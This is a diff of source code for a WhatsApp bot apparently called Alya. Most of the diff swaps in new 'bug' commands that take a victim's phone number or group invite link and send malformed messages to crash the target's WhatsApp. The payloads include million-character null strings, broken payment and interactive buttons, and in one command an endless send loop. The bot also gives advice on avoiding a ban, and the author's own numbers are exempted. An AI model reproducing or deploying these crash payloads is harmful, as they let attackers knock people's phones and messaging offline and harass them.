+                                "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
+                            }],
+                        }),
+                        contextInfo: {
+                            mentionedJid: [m.sender],
+                            forwardingScore: 999,
+                            isForwarded: true,
+                            forwardedNewsletterMessageInfo: {
+                                newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
+                                newsletterName: ownername,
+                                serverMessageId: 143
+                            }
+                        }
+                    })
                 }
-                }
-       })
+            }
+        }, { quoted: m });
+
+        await AlyaBotInc.relayMessage(m.chat, msgs.message, {});
+
+    } catch (e) {
+        console.error(e);
+        return replygcalya("`*An unexpected error occurred. Please try again later*`");
     }
-  }
-}, { quoted: m })
-await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
- } catch(e) {
- return replygcalya("`*Error*`")
 }
-}
-    break
+break;
         case 'diffusion-anime': {
 	if (!text) return replygcalya(`*• Example:* ${prefix + command} what is your name`);   
         try {
@@ -19397,7 +18961,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `> Claude AI\n\n${gpt.result.response}`
+            text: `> Claude AI\n\n${gpt.result}`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -21261,793 +20825,562 @@ break;
                replygcalya(b)
             }
             break
-            
-            //bug && war cases 
-//⚠️do not edit cases otherwise bug not work
-//bug cases 
 case 'clearchat':
 m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
 break
 //================{Bug Cases}===========\\
 case "alyacrash": {
-    if (!isPremium) return replygcalya(mess.prem);
-    if (!text) 
-        return replygcalya(
-        `Use ${prefix + command} Victim number\nExample ${prefix + command} 23481xxxxxxxx`
-    );
-
-    let number = text.split(",")[0];
-    let cleanedNumber = number.replace(/[^0-9]/g, "");
-    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
-
-    var contactInfo = await AlyaBotInc.onWhatsApp(whatsappNumber);
-
-    if (cleanedNumber == "2349123721026") {
-        return;
+  if (!isPremium) return replygcalya(mess.prem)
+  if (!text) return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcalya("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await AlyaBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "2348100835767") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcalya("The number is not registered on WhatsApp");
+  }
+  replygcalya("please wait, " + command + " bug is in process..");
+  await blackening(whatsappNumber, encodedAmount);
+  await xeonkillpic(whatsappNumber, encodedAmount);
+  await locationxeony(whatsappNumber, encodedAmount);
+  sendVariousMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); 
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xios": {
+  if (!isPremium) return replygcalya(mess.prem)
+  if (!text) return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcalya("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await AlyaBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "2348100835767") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcalya("The number is not registered on WhatsApp");
+  }
+  replygcalya("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xios2":
+  {
+	if (!isPremium) return replygcalya(mess.prem)
+    if (!isBot) {
+      return replygcalya("*This feature is for the bot only!*");
     }
-
-    if (contactInfo.length == 0) {
-        return replygcalya("The number is not registered on WhatsApp");
+    if (!text){
+      return replygcalya(`Example usage: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return replygcalya("Amount must be a number");
     }
-
-    replygcalya("please wait, " + command + " hack is in process..");
-    
-    // Define function to add random delay between actions
-    const randomDelay = (min, max) => {
-        return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1) + min)));
-    };
-
-    for (let j = 0; j < 5; j++) { // Loop 5 times
-        await bakdok(whatsappNumber, Alyabug);
-         // Random delay between 2 
-        await sendPaymentInfoMessage(whatsappNumber, Alyabug);
-        await penghitaman(whatsappNumber, painbug);
-        await iponcrash(whatsappNumber, force2);
-        await iponcrash(whatsappNumber, force);
-        await sendSystemCrashMessage(whatsappNumber, force);
-   sendSystemCrashMessage(whatsappNumber, force2);
-        await sendPaymentInfoMessage(whatsappNumber, painbug);
-        await ngeloc(whatsappNumber, force2);
-        await ngeloc(whatsappNumber, painbug);
-
-         if (j === 1) {
-            // Additional logic if needed
-        }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcalya("please wait, " + command + " bug is in process..");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendMultiplePaymentInvites(from, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+  break;
+  case "xandroid2":
+  {
+	if (!isPremium) return replygcalya(mess.prem)
+    if (!isBot) {
+      return replygcalya("*This feature is for the bot only!*");
     }
-  replygcalya(
-        "TARGET ELIMINATED ☠️ @" +
-        whatsappNumber.split("@")[0] +
-        " Using " +
-        command +
-        "👑ALYA IS SUPREME 👑",
-        [whatsappNumber]
-    );
+    if (!text){
+      return replygcalya(`Example usage: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return replygcalya("Amount must be a number");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcalya("please wait, " + command + " bug is in process..");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendVariousMessages(from, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+  break;
+  case "xgc":
+  {
+    if (!isPremium) return replygcalya(mess.prem)
+    if (!text) {
+      return replygcalya("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
+    }
+    replygcalya("please wait, " + command + " bug is in process..");
+    if (!text.split(" ")[0].includes("whatsapp.com")) {
+      return replygcalya("Link Invalid!");
+    }
+    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
+    try {
+      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
+      let groupTarget = await AlyaBotInc.groupAcceptInvite(groupLink);
+      await sleep(2000); // Adjusted sleep time for clarity
+      sendViewOnceMessages(groupTarget, bugAmount);
+      await sleep(2500); // Adjusted sleep time for clarity
+      replygcalya("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
+      AlyaBotInc.groupLeave(groupTarget);
+    } catch (error) {
+      replygcalya(util.format(error));
+    }
+  }
+  break;
+  case "🙂":
+  {
+	if (!isPremium) return replygcalya(mess.prem)
+    if (!isBot) {
+      return replygcalya("*This feature is for the bot only!*");
+    }
+    if (!text){
+      return replygcalya(`Example usage: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return replygcalya("Amount must be a number");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcalya("please wait, " + command + " bug is in process..");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendViewOnceMessages(from, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+  break;
+  case "systemuicrash": {
+  if (!isPremium) return replygcalya(mess.prem)
+  if (!text) return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcalya("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await AlyaBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "2348100835767") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcalya("The number is not registered on WhatsApp");
+  }
+  replygcalya("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMixedMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xsysui": {
+  if (!isPremium) return replygcalya(mess.prem)
+  if (!text) return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcalya("Amount must be a number");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await AlyaBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "2348100835767") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcalya("The number is not registered on WhatsApp");
+  }
+  replygcalya("please wait, " + command + " bug is in process..");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendRepeatedMessages2(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
 }
 break;
 
-                case "oneshot":
-                    {
-                        if (!AlyaTheQueen) return replygcalya(mess.owner);
-                        if (!text)
-                            return replygcalya(`Usage .${command} 2349123721026`);
-                        let cleanedNumber = text.replace(/[^0-9]/g, "");
-                        if (cleanedNumber.startsWith("0"))
-                            return replygcalya(
-                            `Example : ${prefix + command} 2349123721026`
-                        );
-                        var contactInfo = await AlyaBotInc.onWhatsApp(
-                            cleanedNumber + "@s.whatsapp.net"
-                        );
-                        let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
-                        if (cleanedNumber == "2349123721026") {
-                            return;
-                        }
-                        if (cleanedNumber == "2349123721026") {
-                            return;
-                        }
-                        if (cleanedNumber == "2349123721026") {
-                            return;
-                        }
-                        if (contactInfo.length == 0) {
-                            return replygcalya(
-                                "The number is not registered on WhatsApp"
-                            );
-                        }
-                        async function alyareignsShot(jid) {
-                            for (let i = `3`; i !== 0; i -= 1) {
-                                const crasoh = await AlyaBotInc.relayMessage(
-                                    jid,
-                                    {
-                                        extendedTextMessage: {
-                                            text: "👑ALYA IS SUPREME 👑",
-                                            matchedText:
-                                            "I REIGN SUPREME AMONG ALL",
-                                            canonicalUrl: "https://example.com",
-                                            description:
-                                            "👑ALYA IS SUPREME 👑👑ALYA IS SUPREME 👑👑ALYA IS SUPREME 👑",
-                                            title: "👑ALYA IS SUPREME 👑",
-                                            textArgb: 0xff000000,
-                                            backgroundArgb: 0xffffffff,
-                                            font: 1,
-                                            previewType: 0,
-                                            jpegThumbnail: await getBuffer(
-                                                "https://example.com/thumb.jpg"
-                                            ),
-                                            contextInfo: {},
-                                            doNotPlayInline: false,
-                                            thumbnailDirectPath:
-                                            "https://example.com/thumb.jpg",
-                                            thumbnailSha256: Buffer.from(
-                                                "1234567890abcdef",
-                                                "hex"
-                                            ),
-                                            thumbnailEncSha256: Buffer.from(
-                                                "abcdef1234567890",
-                                                "hex"
-                                            ),
-                                            mediaKey: Buffer.from(
-                                                "abcdef1234567890abcdef1234567890",
-                                                "hex"
-                                            ),
-                                            mediaKeyTimestamp: Date.now(),
-                                            thumbnailHeight: 200,
-                                            thumbnailWidth: 200,
-                                            inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
-                                            inviteLinkParentGroupSubjectV2:
-                                            "Parent Group Subject",
-                                            inviteLinkParentGroupThumbnailV2:
-                                            Buffer.from(
-                                                "abcdef1234567890",
-                                                "hex"
-                                            ),
-                                            inviteLinkGroupTypeV2: 0,
-                                            viewOnce: true
-                                        }
-                                    },
-                                    {
-                                        participant: {
-                                            jid: jid
-                                        }
-                                    }
-                                );
-                            }
-                            for (let i = `3`; i !== 0; i -= 1) {
-                                await AlyaBotInc.relayMessage(
-                                    jid,
-                                    {
-                                        viewOnceMessage: {
-                                            message: {
-                                                messageContextInfo: {
-                                                    deviceListMetadataVersion: 2,
-                                                    deviceListMetadata: {}
-                                                },
-                                                interactiveMessage: {
-                                                    nativeFlowMessage: {
-                                                        buttons: [{
-                                                            name: "payment_info",
-                                                            buttonParamsJson:
-                                                            '{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"👑드림 가이 KING","key":"+916909137213","key_type":"X"}}]}'
-                                                        }]
-                                                    }
-                                                }
-                                            }
-                                        }
-                                    },
-                                    {
-                                        participant: {
-                                            jid: jid
-                                        }
-                                    },
-                                    {
-                                        messageId: null
-                                    }
-                                );
-                            }
-                            for (let i = `3`; i !== 0; i -= 1) {
-                                await AlyaBotInc.relayMessage(
-                                    jid,
-                                    {
-                                        viewOnceMessage: {
-                                            message: {
-                                                interactiveMessage: {
-                                                    header: {
-                                                        title: "",
-                                                        subtitle: " "
-                                                    },
-                                                    body: {
-                                                        text: "👑ALYA IS SUPREME 👑"
-                                                    },
-                                                    footer: {
-                                                        text: "xp"
-                                                    },
-                                                    nativeFlowMessage: {
-                                                        buttons: [{
-                                                            name: "cta_url",
-                                                            buttonParamsJson:
-                                                            "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
-                                                        }],
-                                                        messageParamsJson:
-                                                        "\0".repeat(1000000)
-                                                    }
-                                                }
-                                            }
-                                        }
-                                    },
-                                    {
-                                        participant: {
-                                            jid: jid
-                                        }
-                                    }
-                                );
-                            }
-                        }
-                        await replygcalya(`In process....`);
-                        await alyareignsShot(whatsappNumber);
-                        sendMessageWithMentions(
-                            "Successfully Sent Bug To @" +
-                            whatsappNumber.split("@")[0] +
-                            " Using *" +
-                            command +
-                            "👑ALYA IS SUPREME 👑",
-                            [whatsappNumber]
-                        );
-                    }
-                    
-break;
-
-case "xiosfreeze": {
-if (!AlyaTheQueen) return replygcalya(mess.owner);
-if (!text)
-return replygcalya(`Usage .${command} 2348100xxxxxxx`);
-let cleanedNumber = text.replace(/[^0-9]/g, "");
-if (cleanedNumber.startsWith("0"))
-return replygcalya(
-`Example : ${prefix + command} 2348100xxxxxxx`
-);
-var contactInfo = await AlyaBotInc.onWhatsApp(
-cleanedNumber + "@s.whatsapp.net"
-);
-let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
-if (cleanedNumber == "2349123721026") {
-return;
+case 'oneshot': {
+	if (!isCreator) return replygcalya(mess.owner)
+if (!text) return replygcalya(`Usage .${command} 2348100835767`)
+let cleanedNumber = text.replace(/[^0-9]/g, '');
+if (cleanedNumber.startsWith('0')) return replygcalya(`Example : ${prefix+command} 2348100835767`)
+var contactInfo = await AlyaBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "2348100835767") {
+    return;
+    }
+    if (cleanedNumber == "2348100835767") {
+    return;
+    }
+    if (cleanedNumber == "919402104403") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcalya("The number is not registered on WhatsApp");
+  }
+  async function xeonIosShot(jid) {
+    						for (let i = `3`; i !== 0; i -= 1) {
+					const crasoh = await AlyaBotInc.relayMessage(jid,
+						{
+							extendedTextMessage: {
+								text: '👑 KING',
+								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
+								canonicalUrl: 'https://example.com',
+								description: '👑 KING  👑 KING 👑 KING 👑 KING',
+								title: '👑 KING',
+								textArgb: 0xff000000,
+								backgroundArgb: 0xffffffff,
+								font: 1,
+								previewType: 0,
+								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
+								contextInfo: {
+								},
+								doNotPlayInline: false,
+								thumbnailDirectPath: 'https://example.com/thumb.jpg',
+								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
+								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
+								mediaKey: Buffer.from(
+									'abcdef1234567890abcdef1234567890',
+									'hex'
+								),
+								mediaKeyTimestamp: Date.now(),
+								thumbnailHeight: 200,
+								thumbnailWidth: 200,
+								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
+								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
+								inviteLinkParentGroupThumbnailV2: Buffer.from(
+									'abcdef1234567890',
+									'hex'
+								),
+								inviteLinkGroupTypeV2: 0,
+								viewOnce: true,
+							},
+						},
+						{ participant: { jid: jid } }
+					);
+				}
+	for (let i = `3`; i !== 0; i -= 1) {
+       await AlyaBotInc.relayMessage(
+					jid,
+					{
+						viewOnceMessage: {
+							message: {
+								messageContextInfo: {
+									deviceListMetadataVersion: 2,
+									deviceListMetadata: {},
+								},
+								interactiveMessage: {
+									nativeFlowMessage: {
+										buttons: [
+											{
+												name: 'payment_info',
+												buttonParamsJson:
+													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"👑 KING","key":"+2348100835767","key_type":"X"}}]}',
+											},
+										],
+									},
+								},
+							},
+						},
+					},
+					{ participant: { jid: jid } },
+					{ messageId: null }
+				);
+				}
+				for (let i = `3`; i !== 0; i -= 1) {
+					await AlyaBotInc.relayMessage(
+						jid,
+						{
+							viewOnceMessage: {
+								message: {
+									interactiveMessage: {
+										header: {
+											title: '',
+											subtitle: ' ',
+										},
+										body: {
+											text: '👑 KING 👑 KING 👑 KING',
+										},
+										footer: {
+											text: 'xp',
+										},
+										nativeFlowMessage: {
+											buttons: [
+												{
+													name: 'cta_url',
+													buttonParamsJson:
+														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
+												},
+											],
+											messageParamsJson: '\0'.repeat(1000000),
+										},
+									},
+								},
+							},
+						},
+						{ participant: { jid: jid } }
+					);
+					}
+				}
+await replygcalya(`In process....`)
+            await xeonIosShot(whatsappNumber);
+            sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+            }
+            
+				break;
+				case 'xpayment': {
+					if (!isPremium) return replygcalya(mess.prem)
+if (!text) return replygcalya(`Usage .${command} 2348100835767`)
+let cleanedNumber = text.replace(/[^0-9]/g, '');
+if (cleanedNumber.startsWith('0')) return replygcalya(`Example : ${prefix+command} 2348100835767`)
+var contactInfo = await AlyaBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "2348100835767") {
+    return;
+    }
+    if (cleanedNumber == "2348100835767") {
+    return;
+    }
+    if (cleanedNumber == "919402104403") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcalya("The number is not registered on WhatsApp");
+  }
+  async function xeonBugPay(jid){
+				await AlyaBotInc.relayMessage(
+					jid,
+					{
+						viewOnceMessage: {
+							message: {
+								messageContextInfo: {
+									deviceListMetadataVersion: 2,
+									deviceListMetadata: {},
+								},
+								interactiveMessage: {
+									nativeFlowMessage: {
+										buttons: [
+											{
+												name: 'payment_info',
+												buttonParamsJson:
+													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+2348100835767","key_type":"X"}}]}',
+											},
+										],
+									},
+								},
+							},
+						},
+					},
+					{ participant: { jid: jid } },
+					{ messageId: null }
+				);
+				}
+				await xeonBugPay(whatsappNumber);
+            sendMessageWithMentions(
+    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    [whatsappNumber]
+  );
+				}
+				break;
+		case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
+if (!isPremium) return replygcalya(mess.prem)
+if (!q) return replygcalya(`Usage .${command} 2348100835767`)
+let xeonyvictim = q.replace(/[^0-9]/g, "")
+if (xeonyvictim.startsWith('0')) return replygcalya(`Example : .${command} 2348100835767`)
+let target = xeonyvictim + '@s.whatsapp.net'
+await replygcalya(`In process....`)
+for (let j = 0; j < 1; j++) {
+await listxeonfck(target, oneclickxeon)
+await locationxeony(target, force)
+await xeonkillpic(target, oneclickxeon)
+await locationxeony(target, force)
+await blackening(target, force2)
+await locationxeony(target, force)
 }
-if (cleanedNumber == "2349123721026") {
-return;
+await replygcalya(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
 }
-if (cleanedNumber == "2349123721026") {
-return;
+break
+case 'ioskill': case 'iosx': {
+            	if (!isPremium) return replygcalya(mess.prem)
+let xeonyvictim = q.replace(/[^0-9]/g, "")
+if (xeonyvictim.startsWith('0')) return replygcalya(`Example : .${command} 2348100835767`)
+await replygcalya(`In process....`)
+let target = xeonyvictim + '@s.whatsapp.net'
+  for (;;) {
+    await aipong(target)
+    await sleep(1200)
+  }
 }
-if (contactInfo.length == 0) {
-return replygcalya(
-"The number is not registered on WhatsApp"
-);
-}
-async function alyareignsShot(jid) {
-for (let i = `3`; i !== 0; i -= 1) {
-const crasoh = await AlyaBotInc.relayMessage(
-jid,
-{
-extendedTextMessage: {
-text: "👑KING 👑👑ALYA",
-matchedText:
-"I REIGN SUPREME AMONG ALL",
-canonicalUrl: "https://example.com",
-description:
-"👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA",
-title: "👑KING 👑👑ALYA",
-textArgb: 0xff000000,
-backgroundArgb: 0xffffffff,
-font: 1,
-previewType: 0,
-jpegThumbnail: await getBuffer(
-"https://example.com/thumb.jpg"
-),
-contextInfo: {},
-doNotPlayInline: false,
-thumbnailDirectPath:
-"https://example.com/thumb.jpg",
-thumbnailSha256: Buffer.from(
-"1234567890abcdef",
-"hex"
-),
-thumbnailEncSha256: Buffer.from(
-"abcdef1234567890",
-"hex"
-),
-mediaKey: Buffer.from(
-"abcdef1234567890abcdef1234567890",
-"hex"
-),
-mediaKeyTimestamp: Date.now(),
-thumbnailHeight: 200,
-thumbnailWidth: 200,
-inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
-inviteLinkParentGroupSubjectV2:
-"Parent Group Subject",
-inviteLinkParentGroupThumbnailV2:
-Buffer.from(
-"abcdef1234567890",
-"hex"
-),
-inviteLinkGroupTypeV2: 0,
-viewOnce: true
-}
-},
-{
-participant: {
-jid: jid
-}
-}
-);
-}
-for (let i = `3`; i !== 0; i -= 1) {
-await AlyaBotInc.relayMessage(
-jid,
-{
-viewOnceMessage: {
-message: {
-messageContextInfo: {
-deviceListMetadataVersion: 2,
-deviceListMetadata: {}
-},
-interactiveMessage: {
-nativeFlowMessage: {
-buttons: [{
-name: "payment_info",
-buttonParamsJson:
-'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"👑드림 가이 KING","key":"+916909137213","key_type":"X"}}]}'
-}]
-}
-}
-}
-}
-},
-{
-participant: {
-jid: jid
-}
-},
-{
-messageId: null
-}
-);
-}
-for (let i = `3`; i !== 0; i -= 1) {
-await AlyaBotInc.relayMessage(
-jid,
-{
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-header: {
-title: "",
-subtitle: " "
-},
-body: {
-text: "👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA"
-},
-footer: {
-text: "xp"
-},
-nativeFlowMessage: {
-buttons: [{
-name: "cta_url",
-buttonParamsJson:
-"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
-}],
-messageParamsJson:
-"\0".repeat(1000000)
-}
-}
-}
-}
-},
-{
-participant: {
-jid: jid
-}
-}
-);
-}
-}
-await replygcalya(`In process....`);
-await alyareignsShot(whatsappNumber);
-sendMessageWithMentions(
-"Successfully Sent Bug To @" +
-whatsappNumber.split("@")[0] +
-" Using *" +
-command +
-"👑ALYA IS SUPREME 👑",
-[whatsappNumber]
-);
-}
-break;
-case "freeze-kill": {
-if (!AlyaTheQueen) return replygcalya(mess.owner);
-if (!text)
-return replygcalya(`Usage .${command} 2349123721026`);
-let cleanedNumber = text.replace(/[^0-9]/g, "");
-if (cleanedNumber.startsWith("0"))
-return replygcalya(
-`Example : ${prefix + command} 2349123721026`
-);
-var contactInfo = await AlyaBotInc.onWhatsApp(
-cleanedNumber + "@s.whatsapp.net"
-);
-let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
-if (cleanedNumber == "2349123721026") {
-return;
-}
-if (cleanedNumber == "2349123721026") {
-return;
-}
-if (cleanedNumber == "2349123721026") {
-return;
-}
-if (contactInfo.length == 0) {
-return replygcalya(
-"The number is not registered on WhatsApp"
-);
-}
-async function alyareignsShot(jid) {
-for (let i = `3`; i !== 0; i -= 1) {
-const crasoh = await AlyaBotInc.relayMessage(
-jid,
-{
-extendedTextMessage: {
-text: "👑KING 👑👑ALYA",
-matchedText:
-"I REIGN SUPREME AMONG ALL",
-canonicalUrl: "https://example.com",
-description:
-"👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA",
-title: "👑KING 👑👑ALYA",
-textArgb: 0xff000000,
-backgroundArgb: 0xffffffff,
-font: 1,
-previewType: 0,
-jpegThumbnail: await getBuffer(
-"https://example.com/thumb.jpg"
-),
-contextInfo: {},
-doNotPlayInline: false,
-thumbnailDirectPath:
-"https://example.com/thumb.jpg",
-thumbnailSha256: Buffer.from(
-"1234567890abcdef",
-"hex"
-),
-thumbnailEncSha256: Buffer.from(
-"abcdef1234567890",
-"hex"
-),
-mediaKey: Buffer.from(
-"abcdef1234567890abcdef1234567890",
-"hex"
-),
-mediaKeyTimestamp: Date.now(),
-thumbnailHeight: 200,
-thumbnailWidth: 200,
-inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
-inviteLinkParentGroupSubjectV2:
-"Parent Group Subject",
-inviteLinkParentGroupThumbnailV2:
-Buffer.from(
